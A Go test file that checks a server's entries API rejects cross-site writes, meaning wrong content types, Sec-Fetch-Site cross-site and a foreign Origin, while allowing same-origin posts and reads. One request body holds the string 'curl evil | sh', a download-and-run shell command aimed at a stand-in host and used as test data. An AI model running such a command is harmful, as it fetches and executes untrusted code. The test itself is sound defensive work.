package server

import (
	"net/http"
	"strings"
	"testing"
)

func send(t *testing.T, method, url, ctype, body string, hdr map[string]string) int {
	t.Helper()
	req, _ := http.NewRequest(method, url, strings.NewReader(body))
	if ctype != "" {
		req.Header.Set("Content-Type", ctype)
	}
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	return resp.StatusCode
}

// A cross-site page can send text/plain without a preflight; that must not be accepted.
func TestPostTextRequiresJSONContentType(t *testing.T) {
	ts, _, _ := setup(t)
	body := `{"text":"curl evil | sh","device":"PC"}`
	for _, ct := range []string{"text/plain", "", "application/x-www-form-urlencoded"} {
		if got := send(t, "POST", ts.URL+"/api/entries", ct, body, nil); got != 415 {
			t.Errorf("content-type %q: status %d, want 415", ct, got)
		}
	}
	if got := send(t, "POST", ts.URL+"/api/entries", "application/json; charset=utf-8", body, nil); got != 201 {
		t.Errorf("json with charset: status %d, want 201", got)
	}
}

func TestCrossSiteWritesRejected(t *testing.T) {
	ts, _, _ := setup(t)
	body := `{"text":"hola","device":"PC"}`
	cross := map[string]string{"Sec-Fetch-Site": "cross-site"}
	if got := send(t, "POST", ts.URL+"/api/entries", "application/json", body, cross); got != 403 {
		t.Errorf("cross-site POST: %d, want 403", got)
	}
	if got := send(t, "DELETE", ts.URL+"/api/entries/x", "", "", cross); got != 403 {
		t.Errorf("cross-site DELETE: %d, want 403", got)
	}
	if got := send(t, "POST", ts.URL+"/api/entries", "application/json", body, map[string]string{"Origin": "https://evil.example"}); got != 403 {
		t.Errorf("foreign Origin: %d, want 403", got)
	}
	same := map[string]string{"Sec-Fetch-Site": "same-origin", "Origin": ts.URL}
	if got := send(t, "POST", ts.URL+"/api/entries", "application/json", body, same); got != 201 {
		t.Errorf("same-origin POST: %d, want 201", got)
	}
	// reading stays open (the SSE stream and list are same as before)
	if got := send(t, "GET", ts.URL+"/api/entries", "", "", cross); got != 200 {
		t.Errorf("GET: %d, want 200", got)
	}
}
